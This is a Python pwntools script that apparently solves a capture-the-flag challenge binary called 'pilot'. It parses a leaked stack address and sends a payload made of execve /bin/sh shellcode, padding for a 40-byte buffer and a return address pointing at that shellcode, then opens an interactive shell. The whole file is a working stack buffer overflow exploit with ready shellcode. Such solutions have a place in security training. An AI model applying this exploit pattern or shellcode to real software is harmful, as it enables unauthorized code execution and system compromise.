#!/usr/bin/python3

# import pwntools
from pwn import *
# import re for regex
from re import *

# only show errors
context.log_level = 'ERROR'

# start the binary process
context.binary = ELF("./pilot", checksec=False)
p = process()

# grab the stack address leaked by the program
line = (p.recvuntil(b"Command:")).decode()
leaked_addr = int(search(r'0x[\da-f]+', line).group(), 16)

# 23B execve /bin/sh shellcode from https://www.exploit-db.com/exploits/46907
shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"

# add the shellcode + padding to fill 40B buffer + address of shellcode to return to and execute
payload = shellcode + b"A" * (40 - len(shellcode)) + p64(leaked_addr)

# send the payload and enter interactive mode for the shell
p.sendline(payload)
p.interactive()
